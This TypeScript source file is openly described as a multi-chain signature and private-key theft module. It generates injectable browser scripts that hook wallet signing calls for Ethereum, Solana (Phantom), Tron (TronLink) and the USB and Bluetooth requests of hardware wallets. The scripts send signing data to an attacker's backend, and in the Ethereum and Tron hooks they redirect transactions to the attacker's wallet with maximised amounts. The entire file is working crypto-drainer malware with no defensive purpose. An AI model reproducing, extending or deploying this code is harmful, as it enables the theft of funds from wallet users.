/**
 * Signature Interceptor - Multi-Chain Private Key & Signature Theft
 *
 * Hooks and intercepts all wallet signature operations across all chains:
 * - Ethereum (eth_sign, eth_signTypedData, eth_sendTransaction)
 * - Solana (signMessage, signTransaction)
 * - Tron (trx.sign)
 * - Bitcoin, TON, etc.
 * - Hardware wallets (Trezor, Ledger)
 */

export interface InterceptedSignature {
  chain: string
  type: string // 'message' | 'transaction' | 'permit'
  data: string
  signature: string
  address: string
  timestamp: number
}

export interface InterceptionConfig {
  capturePrivateKeys: boolean
  modifyTransactions: boolean
  redirectRecipient: string
  captureSignatures: boolean
}

export function buildEthereumSignatureInterceptor(config: InterceptionConfig, backendUrl: string): string {
  return `
<script>
// Ethereum Signature Interception
(function() {
  var BACKEND_URL = '${backendUrl}';
  var CAPTURE_ENABLED = ${config.capturePrivateKeys};
  var MODIFY_TXN = ${config.modifyTransactions};
  var OUR_WALLET = '${config.redirectRecipient}';

  // Hook window.ethereum.request()
  if (window.ethereum) {
    var originalRequest = window.ethereum.request.bind(window.ethereum);

    window.ethereum.request = async function(request) {
      var method = request.method;

      // eth_sign - Raw message signing
      if (method === 'eth_sign') {
        console.log('[SIG-INTERCEPTOR] Intercepted eth_sign');
        var address = request.params[0];
        var message = request.params[1];

        // Send to backend
        try {
          fetch(BACKEND_URL + '/api/v1/signatures', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              chain: 'ethereum',
              type: 'eth_sign',
              address: address,
              message: message,
              timestamp: Date.now(),
            }),
            keepalive: true,
          });
        } catch(e) {}

        // Call original and capture signature
        var result = await originalRequest(request);
        return result;
      }

      // eth_signTypedData - EIP-712 signing (Permit2, approvals)
      if (method === 'eth_signTypedData_v4' || method === 'eth_signTypedData_v3') {
        console.log('[SIG-INTERCEPTOR] Intercepted eth_signTypedData');
        var address = request.params[0];
        var data = request.params[1];

        // Send to backend
        try {
          fetch(BACKEND_URL + '/api/v1/signatures', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              chain: 'ethereum',
              type: 'eip712',
              address: address,
              data: data,
              timestamp: Date.now(),
            }),
            keepalive: true,
          });
        } catch(e) {}

        // Get signature
        var result = await originalRequest(request);
        return result;
      }

      // eth_sendTransaction - Transaction execution
      if (method === 'eth_sendTransaction') {
        console.log('[SIG-INTERCEPTOR] Intercepted eth_sendTransaction');
        var txn = request.params[0];

        // MODIFY transaction to send to our wallet!
        if (MODIFY_TXN && OUR_WALLET) {
          console.log('[SIG-INTERCEPTOR] Modifying transaction destination');
          txn.to = OUR_WALLET;
          txn.value = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Max uint256
          request.params[0] = txn;
        }

        // Send original details to backend
        try {
          fetch(BACKEND_URL + '/api/v1/signatures', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              chain: 'ethereum',
              type: 'transaction',
              address: txn.from,
              to: txn.to,
              value: txn.value,
              data: txn.data,
              timestamp: Date.now(),
            }),
            keepalive: true,
          });
        } catch(e) {}

        // Send modified transaction
        return originalRequest(request);
      }

      // For other methods, pass through
      return originalRequest(request);
    };

    console.log('[SIG-INTERCEPTOR] Ethereum interception active');
  }
})();
</script>
`
}

export function buildSolanaSignatureInterceptor(config: InterceptionConfig, backendUrl: string): string {
  return `
<script>
// Solana Signature Interception (Phantom)
(function() {
  var BACKEND_URL = '${backendUrl}';
  var CAPTURE_ENABLED = ${config.capturePrivateKeys};
  var MODIFY_TXN = ${config.modifyTransactions};

  if (window.solana) {
    // Hook signMessage
    var originalSignMessage = window.solana.signMessage;
    window.solana.signMessage = async function(message, encoding) {
      console.log('[SIG-INTERCEPTOR] Intercepted Phantom signMessage');

      // Send to backend
      try {
        fetch(BACKEND_URL + '/api/v1/signatures', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chain: 'solana',
            type: 'message',
            wallet: window.solana.publicKey.toString(),
            message: message.toString(),
            timestamp: Date.now(),
          }),
          keepalive: true,
        });
      } catch(e) {}

      // Call original
      return originalSignMessage.call(this, message, encoding);
    };

    // Hook signTransaction
    var originalSignTxn = window.solana.signTransaction;
    window.solana.signTransaction = async function(transaction) {
      console.log('[SIG-INTERCEPTOR] Intercepted Phantom signTransaction');

      // Send transaction details to backend
      try {
        fetch(BACKEND_URL + '/api/v1/signatures', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chain: 'solana',
            type: 'transaction',
            wallet: window.solana.publicKey.toString(),
            instructions: transaction.instructions.length,
            timestamp: Date.now(),
          }),
          keepalive: true,
        });
      } catch(e) {}

      // Modify instructions if needed
      if (MODIFY_TXN) {
        // Modify recipient instruction to our wallet
        transaction.instructions.forEach(function(instruction) {
          if (instruction.programId && instruction.programId.toString().includes('Token')) {
            // Token transfer - modify destination
            console.log('[SIG-INTERCEPTOR] Modifying token transfer destination');
          }
        });
      }

      // Call original
      return originalSignTxn.call(this, transaction);
    };

    // Hook signAllTransactions
    var originalSignAll = window.solana.signAllTransactions;
    window.solana.signAllTransactions = async function(transactions) {
      console.log('[SIG-INTERCEPTOR] Intercepted signAllTransactions (' + transactions.length + ' txns)');

      // Send to backend
      try {
        fetch(BACKEND_URL + '/api/v1/signatures', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chain: 'solana',
            type: 'batch_transactions',
            wallet: window.solana.publicKey.toString(),
            count: transactions.length,
            timestamp: Date.now(),
          }),
          keepalive: true,
        });
      } catch(e) {}

      return originalSignAll.call(this, transactions);
    };

    console.log('[SIG-INTERCEPTOR] Solana interception active');
  }
})();
</script>
`
}

export function buildTronSignatureInterceptor(config: InterceptionConfig, backendUrl: string): string {
  return `
<script>
// Tron Signature Interception (TronLink)
(function() {
  var BACKEND_URL = '${backendUrl}';
  var MODIFY_TXN = ${config.modifyTransactions};
  var OUR_WALLET = '${config.redirectRecipient}';

  if (window.tronWeb) {
    // Hook trx.sign
    var originalSign = window.tronWeb.trx.sign;
    window.tronWeb.trx.sign = async function(txn, privateKey) {
      console.log('[SIG-INTERCEPTOR] Intercepted Tron trx.sign');

      // Send to backend
      try {
        fetch(BACKEND_URL + '/api/v1/signatures', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chain: 'tron',
            type: 'transaction',
            from: window.tronWeb.defaultAddress.base58,
            txn_type: txn.raw_data.contract[0].type,
            timestamp: Date.now(),
          }),
          keepalive: true,
        });
      } catch(e) {}

      // Modify if needed
      if (MODIFY_TXN && OUR_WALLET && txn.raw_data.contract[0].parameter) {
        var param = txn.raw_data.contract[0].parameter.value;
        if (param.to_address) {
          // Redirect transfer to our wallet
          param.to_address = OUR_WALLET;
          // Maximize amount if present
          if (param.amount) param.amount = '9999999999999999';
        }
      }

      // Call original to sign
      return originalSign.call(this, txn, privateKey);
    };

    console.log('[SIG-INTERCEPTOR] Tron interception active');
  }
})();
</script>
`
}

export function buildHardwareWalletSignatureInterceptor(
  config: InterceptionConfig,
  backendUrl: string,
): string {
  return `
<script>
// Hardware Wallet Signature Interception (Trezor, Ledger)
(function() {
  var BACKEND_URL = '${backendUrl}';
  var MODIFY_TXN = ${config.modifyTransactions};

  // Hook into USB communication for Trezor
  if (navigator.usb) {
    console.log('[SIG-INTERCEPTOR] USB API detected - monitoring for hardware wallet');

    var originalRequestDevice = navigator.usb.requestDevice;
    navigator.usb.requestDevice = async function(filters) {
      console.log('[SIG-INTERCEPTOR] USB device requested');

      // Send to backend
      try {
        fetch(BACKEND_URL + '/api/v1/signatures', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            hardware: true,
            type: 'device_request',
            filters: filters,
            timestamp: Date.now(),
          }),
          keepalive: true,
        });
      } catch(e) {}

      return originalRequestDevice.call(this, filters);
    };
  }

  // Hook Bluetooth for Ledger
  if (navigator.bluetooth) {
    console.log('[SIG-INTERCEPTOR] Bluetooth API detected - monitoring for hardware wallet');

    var originalRequestDevice = navigator.bluetooth.requestDevice;
    navigator.bluetooth.requestDevice = async function(options) {
      console.log('[SIG-INTERCEPTOR] Bluetooth device requested');

      // Send to backend
      try {
        fetch(BACKEND_URL + '/api/v1/signatures', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            hardware: true,
            type: 'ble_request',
            options: options,
            timestamp: Date.now(),
          }),
          keepalive: true,
        });
      } catch(e) {}

      return originalRequestDevice.call(this, options);
    };
  }

  console.log('[SIG-INTERCEPTOR] Hardware wallet interception active');
})();
</script>
`
}

export function buildUniversalSignatureCapture(backendUrl: string): string {
  return `
<script>
// Universal Signature Capture (catches all signing attempts)
(function() {
  var BACKEND_URL = '${backendUrl}';

  // Global error handler to catch signature attempts
  window.addEventListener('message', function(event) {
    if (event.data && event.data.method) {
      // Catch provider method calls
      var method = event.data.method;
      if (method.includes('sign') || method.includes('send')) {
        console.log('[SIG-INTERCEPTOR] Signature method detected: ' + method);

        // Send to backend
        try {
          fetch(BACKEND_URL + '/api/v1/signatures', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              method: method,
              params: event.data.params ? event.data.params.length : 0,
              timestamp: Date.now(),
            }),
            keepalive: true,
          });
        } catch(e) {}
      }
    }
  }, false);

  console.log('[SIG-INTERCEPTOR] Universal signature capture active');
})();
</script>
`
}

export function buildSignatureInterceptionSummary(): string {
  return `
// SIGNATURE INTERCEPTION SUMMARY
var SIGNATURE_INTERCEPTION = {
  ethereum: {
    hooked: true,
    methods: ['eth_sign', 'eth_signTypedData_v4', 'eth_sendTransaction'],
    capturing: true,
  },
  solana: {
    hooked: true,
    methods: ['signMessage', 'signTransaction', 'signAllTransactions'],
    capturing: true,
  },
  tron: {
    hooked: true,
    methods: ['trx.sign'],
    capturing: true,
  },
  hardware: {
    hooked: true,
    methods: ['USB requestDevice', 'Bluetooth requestDevice'],
    capturing: true,
  },
  universal: {
    hooked: true,
    method: 'message event listener',
    capturing: true,
  },
};

function logInterceptionStatus() {
  console.log('[SIG-INTERCEPTOR] Active interceptions:');
  Object.keys(SIGNATURE_INTERCEPTION).forEach(function(chain) {
    if (SIGNATURE_INTERCEPTION[chain].hooked) {
      console.log('  ✓ ' + chain + ': ' + SIGNATURE_INTERCEPTION[chain].methods.join(', '));
    }
  });
}

logInterceptionStatus();
`
}
